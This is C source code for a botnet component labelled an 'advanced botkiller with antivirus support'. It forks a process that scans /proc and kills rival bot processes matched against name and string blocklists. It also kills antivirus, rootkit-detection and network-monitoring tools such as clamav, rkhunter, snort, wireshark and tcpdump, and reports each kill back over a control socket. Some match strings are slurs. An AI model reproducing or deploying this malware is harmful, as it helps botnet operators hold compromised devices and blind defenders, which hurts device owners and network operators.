// 𝖠𝖣𝖵𝖠𝖭𝖢𝖤𝖣 𝖡𝖮𝖳𝖪𝖨𝖫𝖫𝖤𝖱 𝖶𝖨𝖳𝖧 𝖠𝖭𝖳𝖨𝖵𝖨𝖱𝖴𝖲 𝖲𝖴𝖯𝖯𝖮𝖱𝖳
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <errno.h>
#include <netdb.h>
#include <fcntl.h>
#include <unistd.h>
#include <dirent.h>
#include <linux/limits.h>

pid_t killerid;
#define MAIN "[\x1b[34mkiller\x1b[37m]"

// 𝖤𝖷𝖯𝖠𝖭𝖣𝖤𝖣 𝖡𝖫𝖠𝖢𝖪𝖫𝖨𝖲𝖳
char *bin_names[] = {
    "dvrhelper", "dvrsupport", "mirai", "blade", "demon",
    "hoho", "hakai", "satori", "messiah", "440fp", "miori",
    "nigger", "kowai", "shiro", "Cayosin", "qbot", "corona",
    "root", "shell", "bot", "scan", "brute", "sshbrute",
    "tsunami", "katana", "hajime", "reaper", "anarchy",
    "omnibus", "elknot", "pnscan", "gafgyt", "lightaidra"
};

char *bin_strings[] = {
    "lolnogtfo", "dups", "hakai", "satori", "masuta", "botnet",
    "cracked", "mirai", "slump", "demon", "hoho", "stdflood",
    "udpflood", "tcpflood", "httpflood", "chinese family", 
    "messiah", "shadoh", "osiris", "kowai", "miori", "nigger",
    "cumingay", "shiro", "corona", "qbot", "rootkit", "backdoor",
    "bot.", "ddos", "trojan", "malware", "virus", "worm",
    "tsunami", "katana", "hajime", "reaper", "anarchy"
};

// 𝖠𝖭𝖳𝖨𝖵𝖨𝖱𝖴𝖲 𝖯𝖱𝖮𝖢𝖤𝖲𝖲𝖤𝖲
char *av_processes[] = {
    "clamav", "avast", "avg", "bitdefender", "kaspersky",
    "mcafee", "norton", "sophos", "eset", "fsecure",
    "malwarebytes", "windowsdefender", "rkhunter", "chkrootkit",
    "lynis", "tripwire", "aide", "ossec", "suricata", "snort"
};

// 𝖲𝖤𝖢𝖴𝖱𝖨𝖳𝖸 𝖳𝖮𝖮𝖫𝖲
char *sec_tools[] = {
    "wireshark", "tcpdump", "tshark", "nmap", "nessus",
    "metasploit", "burpsuite", "sqlmap", "john", "hashcat",
    "hydra", "nikto", "aircrack", "reaver", "wpscan"
};

#define bin_names_size (sizeof(bin_names) / sizeof(unsigned char *))
#define bin_strings_size (sizeof(bin_strings) / sizeof(unsigned char *))
#define av_processes_size (sizeof(av_processes) / sizeof(unsigned char *))
#define sec_tools_size (sizeof(sec_tools) / sizeof(unsigned char *))

void Trim(char *str) {
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}

int kill_bk(void) {
    if(kill(killerid, 9)) {
        return 0;
    } else {
        return 1;
    }
}

int check_exe(void) {
    int fd;
    char path[PATH_MAX];
    sprintf(path, "/proc/%d/exe", getpid());
    if ((fd = open(path, O_RDONLY)) == -1)
        return 0;
    close(fd);
    return 1;
}

// 𝖠𝖣𝖵𝖠𝖭𝖢𝖤𝖣 𝖪𝖨𝖫𝖫𝖤𝖱 𝖶𝖨𝖳𝖧 𝖠𝖭𝖳𝖨𝖵𝖨𝖱𝖴𝖲 𝖲𝖴𝖯𝖯𝖮𝖱𝖳
void advanced_botkiller(int MySock) {
    killerid = fork();
    if(killerid > 0 || killerid == -1)
        return;
    
    if (!check_exe()) return;
    
    int num;
    DIR *dir;
    int pid = 0;
    FILE *target;
    int exefound;
    char resp[1024];
    char mydir[100];
    char buffer[512];
    char exefile[100];
    char mapfile[100];
    int sleep_time = 1;
    int least_pid = 400;
    int max_pid = 99000 + 1;
    int myprocpid = getpid();
    int last_killed_pid = 0;
    
    while(1) {
        // 𝖪𝖨𝖫𝖫 𝖠𝖭𝖳𝖨𝖵𝖨𝖱𝖴𝖲 𝖯𝖱𝖮𝖢𝖤𝖲𝖲𝖤𝖲
        DIR *procdir = opendir("/proc");
        struct dirent *entry;
        
        if(procdir) {
            while((entry = readdir(procdir)) != NULL) {
                if(entry->d_type != DT_DIR) continue;
                
                char *endptr;
                pid_t pid = strtol(entry->d_name, &endptr, 10);
                if(*endptr != '\0') continue;
                
                // 𝖱𝖤𝖠𝖣 𝖯𝖱𝖮𝖢𝖤𝖲𝖲 𝖢𝖮𝖬𝖬𝖠𝖭𝖣
                char cmdline_path[256];
                char cmdline[1024];
                
                snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%d/cmdline", pid);
                FILE *f = fopen(cmdline_path, "r");
                if(!f) continue;
                
                if(fgets(cmdline, sizeof(cmdline), f)) {
                    for(int i = 0; cmdline[i]; i++) {
                        if(cmdline[i] == '\0') cmdline[i] = ' ';
                    }
                    
                    // 𝖢𝖧𝖤𝖢𝖪 𝖥𝖮𝖱 𝖠𝖭𝖳𝖨𝖵𝖨𝖱𝖴𝖲
                    for(int i = 0; i < av_processes_size; i++) {
                        if(strstr(cmdline, av_processes[i])) {
                            kill(pid, 9);
                            memset(resp, 0, sizeof(resp));
                            snprintf(resp, sizeof(resp), MAIN" Killed AV: \x1b[31m%s\x1b[37m (PID: \x1b[33m%d\x1b[37m)\r\n", av_processes[i], pid);
                            if(send(MySock, resp, strlen(resp), 0) == -1) {
                                fclose(f);
                                closedir(procdir);
                                return;
                            }
                            break;
                        }
                    }
                    
                    // 𝖢𝖧𝖤𝖢𝖪 𝖥𝖮𝖱 𝖲𝖤𝖢𝖴𝖱𝖨𝖳𝖸 𝖳𝖮𝖮𝖫𝖲
                    for(int i = 0; i < sec_tools_size; i++) {
                        if(strstr(cmdline, sec_tools[i])) {
                            kill(pid, 9);
                            memset(resp, 0, sizeof(resp));
                            snprintf(resp, sizeof(resp), MAIN" Killed Security Tool: \x1b[31m%s\x1b[37m (PID: \x1b[33m%d\x1b[37m)\r\n", sec_tools[i], pid);
                            if(send(MySock, resp, strlen(resp), 0) == -1) {
                                fclose(f);
                                closedir(procdir);
                                return;
                            }
                            break;
                        }
                    }
                }
                fclose(f);
            }
            closedir(procdir);
        }
        
        // 𝖮𝖱𝖨𝖦𝖨𝖭𝖠𝖫 𝖡𝖮𝖳 𝖪𝖨𝖫𝖫𝖤𝖱 𝖫𝖮𝖦𝖨𝖢
        for(pid=least_pid; pid < max_pid; pid++) {
            if(pid == myprocpid) return;
            if(exefound) exefound = 0;
            snprintf(mydir, sizeof(mydir), "/proc/%d/", pid);
            dir = opendir(mydir);
            if(dir) {
                snprintf(exefile, sizeof(exefile), "/proc/%d/exe", pid);
                target = fopen(exefile, "r");
                if(target != NULL) {
                    while(fgets(buffer, sizeof(buffer) - 1, target)) {
                        Trim(buffer);
                        for(num = 0; buffer[num]; num++)
                            buffer[num] = tolower(buffer[num]);
                        for(num = 0; num < bin_strings_size; num++) {
                            if(strstr(buffer, bin_strings[num])) {
                                memset(resp, 0, sizeof(resp));
                                if(pid != last_killed_pid) {
                                    snprintf(resp, sizeof(resp), MAIN" String match found -> \x1b[35m%s\x1b[37m:\x1b[31m%d\x1b[37m\r\n", bin_strings[num], pid);
                                    if(send(MySock, resp, strlen(resp), 0) == -1) return;
                                }
                                kill(pid, 9);
                                exefound = 1;
                                memset(resp, 0, sizeof(resp));
                                if(pid != last_killed_pid) {
                                    snprintf(resp, sizeof(resp), MAIN" Killed bot process -> \x1b[33m%d\x1b[37m\r\n", pid);
                                    if(send(MySock, resp, strlen(resp), 0) == -1) return;
                                }
                                last_killed_pid = pid;
                            }
                        }
                    }
                    if(!exefound) goto mapskill;
                } else {
                    mapskill:
                    close(target);
                    snprintf(mapfile, sizeof(mapfile), "/proc/%d/maps", pid);
                    target = fopen(mapfile, "r");
                    if(target != NULL) {
                        while(fgets(buffer, sizeof(buffer) - 1, target)) {
                            Trim(buffer);
                            for(num = 0; buffer[num]; num++)
                                buffer[num] = tolower(buffer[num]);
                            for(num = 0; num < bin_names_size; num++) {
                                if(strstr(buffer, bin_names[num])) {
                                    memset(resp, 0, sizeof(resp));
                                    if(pid != last_killed_pid) {
                                        if(strstr(buffer, "deleted")) {
                                            snprintf(resp, sizeof(resp), MAIN" Deleted binary match found -> \x1b[32m%s\x1b[37m:\x1b[36m%d\x1b[37m\r\n", bin_names[num], pid);
                                            if(send(MySock, resp, strlen(resp), 0) == -1) return;
                                        } else {
                                            snprintf(resp, sizeof(resp), MAIN" Binary match found -> \x1b[32m%s\x1b[37m:\x1b[36m%d\x1b[37m\r\n", bin_names[num], pid);
                                            if(send(MySock, resp, strlen(resp), 0) == -1) return;
                                        }
                                    }
                                    kill(pid, 9);
                                    memset(resp, 0, sizeof(resp));
                                    if(pid != last_killed_pid) {
                                        snprintf(resp, sizeof(resp), MAIN" Killed bot process -> \x1b[33m%d\x1b[37m\r\n", pid);
                                        if(send(MySock, resp, strlen(resp), 0) == -1) return;
                                    }
                                    last_killed_pid = pid;
                                }
                            }
                        }
                    }
                }
            } else if(ENOENT == errno)
                continue;
            close(target);
            closedir(dir);
            memset(resp, 0, sizeof(resp));
            memset(mydir, 0, sizeof(mydir));
            memset(buffer, 0, sizeof(buffer));
            memset(exefile, 0, sizeof(exefile));
            memset(mapfile, 0, sizeof(mapfile));
        }
        last_killed_pid = 0;
        sleep(2.5);
    }
}

// 𝖮𝖱𝖨𝖦𝖨𝖭𝖠𝖫 𝖡𝖮𝖳𝖪𝖨𝖫𝖫𝖤𝖱 𝖥𝖴𝖭𝖢𝖳𝖨𝖮𝖭
void botkiller(int MySock) {
    advanced_botkiller(MySock);
}